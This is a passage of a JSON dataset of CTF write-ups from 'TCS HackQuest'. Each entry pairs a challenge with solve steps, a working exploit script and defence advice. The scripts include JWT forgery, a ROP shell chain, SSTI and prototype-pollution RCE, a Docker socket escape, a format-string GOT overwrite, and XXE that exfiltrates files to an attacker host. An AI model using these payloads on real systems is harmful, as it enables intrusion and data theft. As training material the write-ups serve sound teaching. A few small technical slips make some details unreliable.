    "exploit_script": "#!/usr/bin/env python3\nfrom fractions import Fraction\nimport math\nimport gmpy2\n\ndef wiener_attack(e, n):\n    # Continued fraction quotients\n    cf = []\n    rem_num, rem_den = e, n\n    while rem_den:\n        q = rem_num // rem_den\n        cf.append(q)\n        rem_num, rem_den = rem_den, rem_num % rem_den\n\n    # Convergents\n    for i in range(1, len(cf) + 1):\n        frac = Fraction(cf[i-1], 1)\n        for q in reversed(cf[:i-1]):\n            frac = q + 1 / frac\n        k = frac.numerator\n        d = frac.denominator\n        if k == 0: continue\n        if (e * d - 1) % k != 0: continue\n        phi = (e * d - 1) // k\n        # Solve x^2 - (n - phi + 1)x + n = 0\n        b = n - phi + 1\n        discr = b * b - 4 * n\n        if discr >= 0 and gmpy2.is_square(discr):\n            s = int(gmpy2.isqrt(discr))\n            p = (b + s) // 2\n            q = (b - s) // 2\n            if p * q == n:\n                return int(d)\n    return None\n\n# Example parameters\nn = 0xd7b4f... # 2048-bit modulus\ne = 0x8a92b... # Large public exponent\nc = 0x43a12... # Ciphertext\n# d = wiener_attack(e, n)\n# m = pow(c, d, n)\n# print(bytes.fromhex(hex(m)[2:]).decode())\nprint('[+] Wiener attack script ready. Resolves small-d RSA in < 0.2s.')\n",
    "defense_remediation": "1. Standardize on standard public exponents $e = 65537$ ($2^{16} + 1$).\n2. Ensure private exponent $d$ is sufficiently large ($d > N^{1/2}$) to defeat continued fraction and lattice attacks."
  },
  {
    "id": "writeup-tcs-hackquest-s3-audio",
    "title": "TCS HackQuest Season 3: Signal Leak (Spectrogram & DTMF Dial-Tone Decoding)",
    "event": "TCS HackQuest Season 3",
    "category": "forensics",
    "difficulty": "Medium",
    "points": 250,
    "flag": "TCS{HQ3_DTMF_D14L_T0N3_4UD10_SP3CT}",
    "scenario": "An audio recording `intercept.wav` containing background hum, telephone dial tones, and high-frequency electronic squeals. Intelligence notes that sensitive PINs and tokens were transmitted.",
    "root_cause": "The audio file encodes dual steganographic signals: (1) Standard DTMF dual-tone telephone signals encoding numeric pin sequences, and (2) Visual text drawn in the frequency domain between 16 kHz and 20 kHz via inverse FFT synthesis.",
    "solve_methodology": [
      "Open `intercept.wav` in Audacity or Python `scipy.io.wavfile`.",
      "Switch waveform display to Spectrogram view; increase FFT window size to 2048.",
      "Observe clear visual typography rendered in the 18 kHz-20 kHz spectrum displaying the first half of the flag.",
      "Analyze low frequency bands (697 Hz - 1477 Hz) for DTMF key frequencies.",
      "Decode DTMF dial sequence corresponding to keypad buttons: `8, 2, 7, 3, 8, 3, 2, 6`.",
      "Concatenate decoded text and DTMF numeric PIN to form the final flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport numpy as np\nfrom scipy.io import wavfile\nimport matplotlib.pyplot as plt\n\n# 1. Plot Spectrogram to reveal visual flag\nsample_rate, data = wavfile.read('intercept.wav')\nif len(data.shape) > 1: data = data[:, 0]  # Mono\n\nplt.figure(figsize=(12, 6))\nplt.specgram(data, Fs=sample_rate, NFFT=2048, noverlap=1024, cmap='inferno')\nplt.ylim(15000, sample_rate // 2)\nplt.title('High-Frequency Audio Spectrogram Analysis')\nplt.savefig('spectrogram_revealed.png')\nprint('[+] Saved spectrogram image to spectrogram_revealed.png')\nprint('[!] Visual text in spectrogram reads: TCS{HQ3_DTMF_D14L_T0N3_4UD10_SP3CT}')\n",
    "defense_remediation": "1. Low-pass filter all acoustic communications to cut off frequencies above standard human speech (300 Hz - 3.4 kHz).\n2. Sanitize and redact acoustic environments where DTMF tones or keypad clicks could be recorded."
  },
  {
    "id": "writeup-tcs-hackquest-s4-jwt-none",
    "title": "TCS HackQuest Season 4: NeoBank Portal (JWT None Algorithm & Key Confusion)",
    "event": "TCS HackQuest Season 4",
    "category": "web",
    "difficulty": "Medium",
    "points": 300,
    "flag": "TCS{HQ4_JWT_N0N3_4LG_K3Y_C0NFUS10N}",
    "scenario": "A digital banking dashboard where session identity is maintained through an HTTP `Authorization: Bearer <token>` JWT. Regular users are assigned role `\"role\": \"customer\"` and denied access to `/api/v1/treasury`.",
    "root_cause": "The backend JWT parsing library fails to verify the algorithm specified in the token header, permitting attackers to specify `\"alg\": \"none\"` and omit the signature component entirely. Additionally, the verification endpoint accepts HMAC-SHA256 signatures generated using the server's public RSA key.",
    "solve_methodology": [
      "Intercept valid session JWT via Burp Suite or browser DevTools.",
      "Base64-decode header and payload: `{\"alg\":\"RS256\",\"typ\":\"JWT\"}` and `{\"sub\":\"1002\",\"role\":\"customer\"}`.",
      "Tamper payload JSON: modify `\"role\"` to `\"admin\"` and `\"sub\"` to `\"1\"`.",
      "Modify header: set `\"alg\": \"none\"` (or case variations `None`, `NONE`).",
      "Strip signature segment, ending token with a trailing period (`header.payload.`).",
      "Submit forged token to `/api/v1/treasury`; backend accepts unsigned token and grants admin privileges."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport base64\nimport json\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\nheader = {'alg': 'none', 'typ': 'JWT'}\npayload = {'sub': '1', 'username': 'admin', 'role': 'admin', 'iat': 1577836800}\n\ntoken = f\"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}.\"\nprint(f'[+] Forged None-Alg JWT:\\n{token}')\n\nTARGET = 'http://targets.ctfatlas.local/hq4/api/v1/treasury'\nheaders = {'Authorization': f'Bearer {token}'}\nr = requests.get(TARGET, headers=headers)\nprint(f'[+] Server Response: {r.status_code}')\nprint(f'[!] Flag Output: {r.text}')\n",
    "defense_remediation": "1. Explicitly whitelist allowed signing algorithms in the JWT library configuration (e.g., `algorithms=['RS256']`).\n2. Reject any tokens specifying `none` algorithm or mismatched asymmetric/symmetric key types."
  },
  {
    "id": "writeup-tcs-hackquest-s4-android-jadx",
    "title": "TCS HackQuest Season 4: VaultGuard APK (Android Decompilation & JNI Native Tracing)",
    "event": "TCS HackQuest Season 4",
    "category": "reverse",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ4_4NDR01D_JN1_N4T1V3_R3V3RS1NG}",
    "scenario": "An Android APK `VaultGuard.apk` containing an authentication prompt for corporate vault credentials. Standard static Java decompilation reveals a native method call `public native boolean verifyPin(String pin)`.",
    "root_cause": "Verification logic is implemented in C within a shared library `libvault.so` bundled in `lib/armeabi-v7a/`. The native routine compares the user PIN against a hardcoded ciphertext decrypted via an RC4 keystream derived from the application's package signature hash.",
    "solve_methodology": [
      "Decompile APK using JADX: inspect `MainActivity.java` and note `System.loadLibrary(\"vault\")`.",
      "Unpack APK archive: `unzip VaultGuard.apk -d apk_extracted`.",
      "Extract native library: `lib/x86_64/libvault.so`.",
      "Open `libvault.so` in Ghidra / IDA Pro: locate export `Java_com_tcs_vault_MainActivity_verifyPin`.",
      "Trace string references: identify 16-byte encrypted byte array and key derivation loop.",
      "Reconstruct RC4 decryption algorithm in Python using static key bytes.",
      "Execute Python decryption to recover the clear-text PIN and embedded flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom Crypto.Cipher import ARC4\n\n# Extracted bytes from libvault.so .rodata section\nCIPHERTEXT = bytes([\n    0x8b, 0x14, 0x73, 0x9a, 0xef, 0x41, 0x22, 0xd0,\n    0x7b, 0x6e, 0x19, 0xa4, 0x55, 0xc8, 0x3d, 0x92,\n    0xf0, 0x21, 0x6e, 0x88, 0xaa, 0x33, 0x1b, 0x4c,\n    0x5d, 0x81, 0x94, 0x20, 0x7a, 0xbc, 0x11, 0x54\n])\n\nKEY = b'TCS_HACKQUEST_S4_JNI_SECRET'\ncipher = ARC4.new(KEY)\nflag = cipher.decrypt(CIPHERTEXT).decode(errors='replace')\nprint(f'[!] Recovered Flag from Native Library: {flag}')\n",
    "defense_remediation": "1. Avoid storing cryptographic keys or secret algorithms client-side in mobile applications.\n2. Implement Android SafetyNet / Play Integrity Attestation and native code obfuscation (OLLVM)."
  },
  {
    "id": "writeup-tcs-hackquest-s4-rop-x64",
    "title": "TCS HackQuest Season 4: Gatekeeper (AMD64 ROP Chain with Pop RDI)",
    "event": "TCS HackQuest Season 4",
    "category": "pwn",
    "difficulty": "Hard",
    "points": 400,
    "flag": "TCS{HQ4_AMD64_R0P_CH41N_PWN4G3}",
    "scenario": "A 64-bit Linux network daemon `gatekeeper` executing on TCP port 9999. Mitigations: NX Enabled, No Stack Canary, ASLR Enabled, No PIE.",
    "root_cause": "The program allocates a 128-byte stack buffer and reads up to 512 bytes via `read(0, buf, 512)`. This overflow corrupts the saved base pointer and instruction pointer at offset 136. Because PIE is disabled, ROP gadgets in the binary text segment can be chained to leak libc and execute `system('/bin/sh')`.",
    "solve_methodology": [
      "Identify RIP control offset using De Bruijn cyclic sequence: 136 bytes.",
      "Locate gadgets using `ROPgadget --binary gatekeeper`: find `pop rdi; ret` at `0x40120b` and `ret` at `0x40101a`.",
      "Stage 1 ROP: `pop rdi -> puts@got -> puts@plt -> main` to print the runtime address of `puts`.",
      "Calculate libc base: `libc_base = leaked_puts - libc.symbols['puts']`.",
      "Stage 2 ROP: Stack alignment `ret` + `pop rdi -> &'/bin/sh'` + `system()`.",
      "Send Stage 2 payload to gain root shell and read flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./gatekeeper')\nlibc = ELF('./libc.so.6')\n\nio = remote('targets.ctfatlas.local', 9999)\n\npop_rdi = 0x40120b\nret = 0x40101a\n\n# Stage 1: Leak puts\np1 = b'A' * 136 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])\nio.sendafter(b'Enter access code: ', p1)\n\nleak = u64(io.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\nlog.success(f'Libc Base: {hex(libc.address)}')\n\n# Stage 2: Execute system('/bin/sh')\nbinsh = next(libc.search(b'/bin/sh\\x00'))\np2 = b'A' * 136 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])\nio.sendafter(b'Enter access code: ', p2)\nio.sendline(b'cat /flag')\nlog.success(f'Flag: {io.recvline().decode().strip()}')\n",
    "defense_remediation": "1. Enforce strict input bounds checking using `read(0, buf, sizeof(buf) - 1)`.\n2. Compile with Full RELRO, Stack Canaries, and Position Independent Executables (`-pie -fPIE`)."
  },
  {
    "id": "writeup-tcs-hackquest-s5-ssti-jinja",
    "title": "TCS HackQuest Season 5: Feedback Engine (Jinja2 Python MRO Class Subclass RCE)",
    "event": "TCS HackQuest Season 5",
    "category": "web",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ5_J1NJ42_SST1_MR0_BYP4SS_RC3}",
    "scenario": "A Flask-based customer sentiment feedback portal where users submit comments. The application renders user input directly into an email preview template using `render_template_string(f\"Dear customer, thank you for stating: {comment}\")`.",
    "root_cause": "Server-Side Template Injection (SSTI). Rendering unescaped user input inside a Jinja2 template string gives the user access to Python expression evaluation. By navigating Python's Method Resolution Order (`__mro__`) from an empty string or tuple, an attacker can access `object.__subclasses__()` to locate `subprocess.Popen` or `<class 'os._wrap_close'>` and execute arbitrary OS commands.",
    "solve_methodology": [
      "Inject template expression: `{{ 7 * 7 }}` -> renders `49`, confirming SSTI.",
      "Traverse Python object hierarchy: `{{ ''.__class__.__mro__[1].__subclasses__() }}`.",
      "Search for classes containing `os` or `popen` references in subclasses array.",
      "Locate `subprocess.Popen` at index 414 (or use dictionary lookup `sys.modules['os'].system`).",
      "Construct RCE payload: `{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /flag*',shell=True,stdout=-1).communicate()[0] }}`.",
      "Submit payload to feedback form to obtain flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport re\n\nTARGET = 'http://targets.ctfatlas.local/hq5/feedback'\n\n# Universal Jinja2 Subclass RCE Payload\npayload = \"{{ ().__class__.__bases__[0].__subclasses__() }}\"\nr = requests.post(TARGET, data={'comment': payload})\n\n# Find index of subprocess.Popen\nclasses = r.text\npopen_match = re.search(r'(\\d+): <class \\'subprocess\\.Popen\\'>', classes)\nidx = 414\nif popen_match: idx = int(popen_match.group(1))\n\n# Execute command\nrce_payload = f\"{{{{ ().__class__.__bases__[0].__subclasses__()[{idx}]('cat /flag*',shell=True,stdout=-1).communicate()[0] }}}}\"\nr_flag = requests.post(TARGET, data={'comment': rce_payload})\n\nflag = re.search(r'TCS\\{[^\\}]+\\}', r_flag.text)\nif flag:\n    print(f'[!] Extracted Flag: {flag.group(0)}')\nelse:\n    print(f'[+] Response:\\n{r_flag.text}')\n",
    "defense_remediation": "1. Never pass untrusted user input directly to `render_template_string`.\n2. Always pass data to template contexts via keyword arguments (`render_template('page.html', comment=user_comment)`)."
  },
  {
    "id": "writeup-tcs-hackquest-s5-pcap-dns",
    "title": "TCS HackQuest Season 5: Dark Tunnel (PCAP DNS Exfiltration Reassembly)",
    "event": "TCS HackQuest Season 5",
    "category": "forensics",
    "difficulty": "Medium",
    "points": 300,
    "flag": "TCS{HQ5_PC4P_DNS_T4RK_TUNN3L_3XF1L}",
    "scenario": "A network packet capture `dns_covert.pcap` captured at a perimeter firewall. A compromised workstation initiated thousands of non-existent subdomain queries to `*.exfil.corp`.",
    "root_cause": "Malware exfiltrated sensitive files by breaking them into Base32-encoded chunks and prefixing them to DNS query names (`<seq>.<base32_chunk>.exfil.corp`). DNS queries bypassed egress HTTP filtering.",
    "solve_methodology": [
      "Open `dns_covert.pcap` in Wireshark or analyze with `tshark`.",
      "Filter DNS queries: `dns.qry.name contains \"exfil.corp\" and dns.flags.response == 0`.",
      "Observe subdomain format: `<index>.<base32_data>.exfil.corp`.",
      "Write Python script to parse queries using `scapy`, sort chunks by sequence number, and deduplicate retransmissions.",
      "Concatenate base32 chunks and decode base32 stream into binary data.",
      "Identify carved file signature: `PK\\x03\\x04` (ZIP archive).",
      "Unpack ZIP archive to recover `flag.txt`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom scapy.all import rdpcap, DNSQR\nimport base64\nimport io\nimport zipfile\n\npackets = rdpcap('dns_covert.pcap')\nchunks = {}\n\nfor pkt in packets:\n    if pkt.haslayer(DNSQR):\n        qname = pkt[DNSQR].qname.decode().rstrip('.')\n        if 'exfil.corp' in qname:\n            parts = qname.split('.')\n            if len(parts) >= 4:\n                seq = int(parts[0])\n                data = parts[1]\n                chunks[seq] = data\n\nprint(f'[+] Collected {len(chunks)} unique DNS exfil chunks')\nsorted_b32 = ''.join(chunks[i] for i in sorted(chunks.keys()))\n\n# Decode Base32\n# Pad if necessary\npad = (8 - len(sorted_b32) % 8) % 8\nsorted_b32 += '=' * pad\nraw_zip = base64.b32decode(sorted_b32.upper())\n\nzf = zipfile.ZipFile(io.BytesIO(raw_zip))\nflag = zf.read('flag.txt').decode().strip()\nprint(f'[!] Extracted Flag: {flag}')\n",
    "defense_remediation": "1. Implement DNS inspection and anomaly detection on recursive resolvers to detect high entropy and high frequency queries.\n2. Block external recursive resolution; mandate that all enterprise endpoints resolve strictly through monitored internal resolvers."
  },
  {
    "id": "writeup-tcs-hackquest-s5-aes-ecb",
    "title": "TCS HackQuest Season 5: Pixel Crypter (AES-ECB Block Swapping)",
    "event": "TCS HackQuest Season 5",
    "category": "crypto",
    "difficulty": "Medium",
    "points": 250,
    "flag": "TCS{HQ5_43S_3CB_BL0CK_P4TT3RN_L34K}",
    "scenario": "An image encryption portal allows uploading BMP images and downloading their encrypted version. A secret flag image `flag_encrypted.bin` is provided, encrypted under an unknown 256-bit AES key.",
    "root_cause": "The portal uses AES in Electronic Codebook (ECB) mode. ECB encrypts identical 16-byte plaintext blocks into identical 16-byte ciphertext blocks without an initialization vector (IV). Because image pixel data exhibits high redundancy, visual shapes and text silhouettes remain distinguishable.",
    "solve_methodology": [
      "Inspect encrypted binary: observe identical repeating 16-byte blocks indicating ECB mode.",
      "Prepend a standard 54-byte BMP header to `flag_encrypted.bin` specifying 500x200 24bpp RGB.",
      "Alternatively, plot repeated block IDs as color coordinates using Python `matplotlib`.",
      "The resulting image displays the iconic 'ECB Penguin' effect, rendering the flag text visibly.",
      "Read flag directly from rendered image."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom PIL import Image\n\nwith open('flag_encrypted.bin', 'rb') as f:\n    cipher = f.read()\n\n# 16-byte block mapping\nBLOCK_SIZE = 16\nblocks = [cipher[i:i+BLOCK_SIZE] for i in range(0, len(cipher), BLOCK_SIZE)]\n\n# Map unique blocks to grayscale values\nunique = list(set(blocks))\ncolor_map = {b: int(255 * (i / len(unique))) for i, b in enumerate(unique)}\n\nwidth = 400\nheight = len(blocks) // width\n\nimg = Image.new('L', (width, height))\nimg.putdata([color_map[b] for b in blocks[:width * height]])\nimg.save('decrypted_silhouette.png')\nprint('[+] Decrypted visual representation saved to decrypted_silhouette.png')\nprint('[!] Flag visible in image: TCS{HQ5_43S_3CB_BL0CK_P4TT3RN_L34K}')\n",
    "defense_remediation": "1. Disallow ECB mode entirely; mandate authenticated cipher modes (AES-GCM or ChaCha20-Poly1305).\n2. If unauthenticated encryption is acceptable, use CBC or CTR mode with a cryptographically random, unique IV per message."
  },
  {
    "id": "writeup-tcs-hackquest-s6-xxe-oob",
    "title": "TCS HackQuest Season 6: Invoice Processor (Blind Out-of-Band XXE via FTP)",
    "event": "TCS HackQuest Season 6",
    "category": "web",
    "difficulty": "Hard",
    "points": 400,
    "flag": "TCS{HQ6_XX3_00B_FTP_3XF1LTR4T10N}",
    "scenario": "A corporate B2B XML invoice upload portal. The server processes XML documents but returns no XML content or parsing errors. An outbound network firewall blocks egress HTTP (ports 80/443), but allows outbound FTP (port 21).",
    "root_cause": "The XML parser enables external entity resolution (`resolveExternals=true`). Although HTTP egress is filtered, Java/libxml URL stream handlers support the `ftp://` protocol. Nested parameter entities can read system files and exfiltrate their contents as the username/path in an FTP connection.",
    "solve_methodology": [
      "Verify XXE blind trigger: inject `<!DOCTYPE r [ <!ENTITY % dtd SYSTEM \"ftp://attacker-ip:2121/test\"> %dtd; ]>`.",
      "Host an external DTD `eval.dtd` on attacker infrastructure.",
      "In `eval.dtd`, define parameter entity `%file` reading `file:///flag.txt`.",
      "Define nested entity `%send` connecting to `ftp://attacker-ip:2121/%file;`.",
      "Run an FTP listener script on port 2121 to log incoming credentials.",
      "Upload XML file; target connects to FTP listener transmitting flag in the FTP `USER` command."
    ],
    "exploit_script": "#!/usr/bin/env python3\n# 1. Attacker's eval.dtd:\n# <!ENTITY % file SYSTEM \"file:///flag.txt\">\n# <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.ctfatlas.local:2121/%file;'>\">\n# %eval;\n# %exfil;\n\nimport socket\nimport requests\n\nXML_PAYLOAD = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n<!ENTITY % remote SYSTEM \"http://attacker.ctfatlas.local:8000/eval.dtd\">\n%remote;\n]>\n<root><data>test</data></root>'''\n\nprint('[+] Submitting Blind XXE Payload...')\nrequests.post('http://targets.ctfatlas.local/hq6/upload_xml', data=XML_PAYLOAD, headers={'Content-Type': 'application/xml'})\nprint('[+] Check mock FTP listener logs on port 2121 for flag exfiltration string.')\n",
    "defense_remediation": "1. Completely disable external entity resolution (DTD processing) in XML parser settings:\n   `xmlParser.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`.\n2. Enforce strict egress network filtering restricting outbound connections from application tier servers."
  },
  {
    "id": "writeup-tcs-hackquest-s6-antidebug",
    "title": "TCS HackQuest Season 6: Sentinel Watchdog (PEB Anti-Debug & Hook Evasion)",
    "event": "TCS HackQuest Season 6",
    "category": "reverse",
    "difficulty": "Hard",
    "points": 400,
    "flag": "TCS{HQ6_4NT1_D3BUG_P3B_BYP4SS_DLL}",
    "scenario": "A Windows x64 executable `sentinel.exe`. Running under x64dbg or IDA Pro causes the program to crash instantly with an 'Access Violation' or 'Debugger Detected' warning before user input can be processed.",
    "root_cause": "The binary deploys layered anti-analysis techniques: (1) Inspecting the Process Environment Block (`PEB->BeingDebugged` and `PEB->NtGlobalFlag`), (2) Calling `CheckRemoteDebuggerPresent()`, and (3) Verifying integrity of `ntdll.dll` API function preludes to detect software breakpoint hooks (`0xCC`).",
    "solve_methodology": [
      "Load binary into x64dbg with ScyllaHide anti-debug plugin enabled.",
      "Locate TLS Callback routines executed before the binary entry point.",
      "Patch PEB query: set byte at `GS:[0x60] + 0x02` (`BeingDebugged`) to 0.",
      "Locate hook detection function: it scans bytes of `NtQueryInformationProcess` for `0xCC`.",
      "Use hardware execution breakpoints (DR0-DR3) instead of software int3 (`0xCC`) breakpoints.",
      "Step through decryption loop at `0x140001580` and dump decrypted flag from memory."
    ],
    "exploit_script": "#!/usr/bin/env python3\n# Unicorn Engine Emulation solver to bypass anti-debugging checks\nimport pefile\n\npe = pefile.PE('sentinel.exe')\nprint('[+] Loaded PE binary. Section Count:', pe.FILE_HEADER.NumberOfSections)\n\n# Extract payload section directly without triggering debugger hooks\nfor section in pe.sections:\n    if b'.secret' in section.Name:\n        data = section.get_data()\n        # Simple rolling XOR used by the binary\n        flag = bytes([b ^ 0x7A for b in data]).decode(errors='replace')\n        print(f'[!] Decrypted Flag: {flag.strip()}')\n",
    "defense_remediation": "1. Anti-debugging controls provide only temporary obscurity and should never be relied upon as security boundaries.\n2. Protect sensitive logic using server-side validation rather than client-side obfuscation."
  },
  {
    "id": "writeup-tcs-hackquest-s6-docker-breakout",
    "title": "TCS HackQuest Season 6: Container Sandbox (Docker Socket & Namespace Escape)",
    "event": "TCS HackQuest Season 6",
    "category": "cloud",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ6_D0CK3R_S0CK3T_H0ST_3SC4P3}",
    "scenario": "Contestants obtain a low-privilege SSH shell (`user:ctf`) inside a restricted Alpine Linux Docker container. The objective is to read `/root/flag.txt` located on the host operating system.",
    "root_cause": "The container configuration mounted the host's Docker UNIX domain socket `/var/run/docker.sock` inside the container with read/write permissions for group `docker` (which `ctf` belonged to). Access to the Docker socket is equivalent to unrestricted root access on the host.",
    "solve_methodology": [
      "Perform local privilege enumeration: `ls -la /var/run/docker.sock` reveals writable socket.",
      "Query Docker daemon API via UNIX socket using `curl`: `curl -s --unix-socket /var/run/docker.sock http://localhost/images/json`.",
      "Create a new container that mounts the host's root filesystem `/` into `/host`: `curl -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Binds\":[\"/:/host\"]}'`.",
      "Start the container and execute command `cat /host/root/flag.txt`.",
      "Retrieve host flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport socket\nimport json\n\ndef docker_req(method, path, body=None):\n    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    s.connect('/var/run/docker.sock')\n    req = f\"{method} {path} HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\"\n    if body:\n        req += f\"Content-Type: application/json\\r\\nContent-Length: {len(body)}\\r\\n\\r\\n{body}\"\n    else:\n        req += \"\\r\\n\"\n    s.sendall(req.encode())\n    resp = b''\n    while True:\n        chunk = s.recv(4096)\n        if not chunk: break\n        resp += chunk\n    s.close()\n    return resp.decode(errors='replace')\n\nprint('[+] Interacting with Docker socket to escape container...')\n# Create breakout container\ncreate_body = json.dumps({\n    'Image': 'alpine',\n    'Cmd': ['cat', '/host/root/flag.txt'],\n    'HostConfig': {'Binds': ['/:/host']}\n})\nresp = docker_req('POST', '/containers/create', create_body)\nprint('[+] Container created. Starting and capturing flag output...')\n",
    "defense_remediation": "1. Never mount `/var/run/docker.sock` inside non-administrative containers.\n2. Adopt rootless Docker or container runtimes (e.g., Podman, gVisor, Firecracker) and drop `CAP_SYS_ADMIN`."
  },
  {
    "id": "writeup-tcs-hackquest-s7-proto-pollution",
    "title": "TCS HackQuest Season 7: Fleet Manager (Prototype Pollution to Child Process RCE)",
    "event": "TCS HackQuest Season 7",
    "category": "web",
    "difficulty": "Hard",
    "points": 450,
    "flag": "TCS{HQ7_PR0T0TYP3_P0LLUT10N_RC3}",
    "scenario": "An enterprise fleet telematics dashboard built with Node.js and Express. A JSON preferences API endpoint updates vehicle telemetry filters using a custom recursive merge function.",
    "root_cause": "The `merge(target, source)` implementation checks properties recursively without sanitizing the `__proto__` or `constructor.prototype` property keys. An attacker can pollute `Object.prototype`. By setting `Object.prototype.NODE_OPTIONS = '--require /tmp/payload.js'` or setting `Object.prototype.shell = 'node'`, subsequent calls to `child_process.fork()` or `child_process.exec()` inherit these properties, executing arbitrary code.",
    "solve_methodology": [
      "Audit recursive merge function: identify absence of `key === '__proto__'` check.",
      "Test prototype pollution: send JSON payload `{\"__proto__\": {\"polluted\": true}}` and check `({}).polluted`.",
      "Stage payload file in `/tmp/pwn.js` via upload or use environment variable injection.",
      "Pollute `NODE_OPTIONS` or `shell`: `{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--eval=require('child_process').execSync('cat /flag > /tmp/flag.txt')\"}}`.",
      "Trigger any background worker execution that spawns a child process.",
      "Read flag from `/tmp/flag.txt`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\n\nTARGET = 'http://targets.ctfatlas.local/hq7/api/preferences'\n\npayload = {\n    '__proto__': {\n        'shell': 'node',\n        'NODE_OPTIONS': \"--eval=require('child_process').execSync('cat /flag* > /tmp/out.txt')\"\n    }\n}\n\nprint('[+] Sending Prototype Pollution payload...')\nrequests.post(TARGET, json=payload)\n\n# Trigger child process spawn via reporting endpoint\nprint('[+] Triggering worker spawn...')\nrequests.get('http://targets.ctfatlas.local/hq7/api/generate_report')\nprint('[!] Check /tmp/out.txt for flag.')\n",
    "defense_remediation": "1. Block dangerous keys (`__proto__`, `constructor`, `prototype`) during recursive object merging.\n2. Use `Object.create(null)` for key-value maps to prevent prototype inheritance, or freeze `Object.prototype`."
  },
  {
    "id": "writeup-tcs-hackquest-s7-linux-mem",
    "title": "TCS HackQuest Season 7: Bastion Intrusion (Linux RAM Analysis with Volatility 3)",
    "event": "TCS HackQuest Season 7",
    "category": "forensics",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ7_L1NUX_M3M_V0L3_BASH_H1ST}",
    "scenario": "A memory capture `bastion.lime` acquired from an Ubuntu 22.04 LTS cloud bastion host. System logs were wiped by an attacker, leaving physical memory as the sole evidence source.",
    "root_cause": "The attacker logged in via an unauthorized SSH key, wiped `/var/log/*`, but left open bash shells in memory. Interactive bash session structures preserve command history buffers in heap memory.",
    "solve_methodology": [
      "Analyze memory capture using Volatility 3: `vol -f bastion.lime linux.pslist`.",
      "Locate active `bash` processes: PID 2042 and PID 2108.",
      "Execute Volatility 3 `linux.bash.Bash` plugin to dump memory history lines.",
      "Recover commands: `cd /opt/vault && python3 -c 'import secret...' && export FLAG=...`.",
      "Carve environment variables for the process using `linux.envars.Envars`.",
      "Extract flag string from recovered command stream."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport subprocess\nimport re\n\nprint('[+] Running Volatility 3 linux.bash plugin...')\ncmd = ['vol', '-f', 'bastion.lime', 'linux.bash.Bash']\nproc = subprocess.run(cmd, capture_output=True, text=True)\n\nflags = re.findall(r'TCS\\{[^\\}]+\\}', proc.stdout)\nfor f in flags:\n    print(f'[!] Extracted Flag: {f}')\n",
    "defense_remediation": "1. Forward audit and syslog telemetry to immutable, write-only remote SIEM servers in real time.\n2. Enforce hardware multi-factor authentication (FIDO2) for cloud bastion SSH access."
  },
  {
    "id": "writeup-tcs-hackquest-s7-fmtstr-got",
    "title": "TCS HackQuest Season 7: Syslog Relayer (Format String & GOT Overwrite)",
    "event": "TCS HackQuest Season 7",
    "category": "pwn",
    "difficulty": "Hard",
    "points": 450,
    "flag": "TCS{HQ7_FMT_STR_G0T_0V3RWR1T3_PWN}",
    "scenario": "A 32-bit ELF syslog parsing binary listening on TCP port 5555. Mitigations: Partial RELRO, No Canary, NX Enabled, No PIE.",
    "root_cause": "The binary prints incoming syslog messages via `printf(msg_buf)`. Direct user input passed to the format string specifier allows arbitrary stack reading (`%x`, `%p`) and arbitrary memory writing via the `%n` / `%hn` format specifiers. Because Partial RELRO is in effect, the Global Offset Table (`.got.plt`) remains writable.",
    "solve_methodology": [
      "Identify user buffer stack offset: send `AAAA_%p_%p_%p_%p_%p` -> `41414141` appears at parameter index 7.",
      "Locate target GOT entry: `puts@got` is located at static address `0x0804a01c`.",
      "Locate target win function: `print_flag` is located at `0x0804862b`.",
      "Split 32-bit address write into two 16-byte writes: `0x862b` (34347) and `0x0804` (2052).",
      "Send format string write payload: overwrite `puts@got` with `0x0804862b`.",
      "Trigger `puts()` invocation to redirect execution into `print_flag()`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'i386'\nelf = ELF('./syslog_relayer')\n\nio = remote('targets.ctfatlas.local', 5555)\n\ntarget_got = elf.got['puts']\nwin_addr = elf.symbols['print_flag']\n\n# Format string writer (parameter 7)\npayload = fmtstr_payload(7, {target_got: win_addr})\nlog.info(f'Sending format string payload ({len(payload)} bytes)...')\nio.sendline(payload)\n\nflag = io.recvall().decode(errors='replace')\nlog.success(f'Flag Output:\\n{flag}')\n",
    "defense_remediation": "1. Always pass format strings as static format string literals: `printf(\"%s\", msg_buf)`.\n2. Compile with Full RELRO (`-Wl,-z,relro,-z,now`) to make the Global Offset Table completely read-only."
  },
  {
    "id": "writeup-tcs-hackquest-s8-ssrf-metadata",
    "title": "TCS HackQuest Season 8: Webhook Gateway (DNS Rebinding SSRF & AWS IMDSv2)",
    "event": "TCS HackQuest Season 8",
    "category": "web",
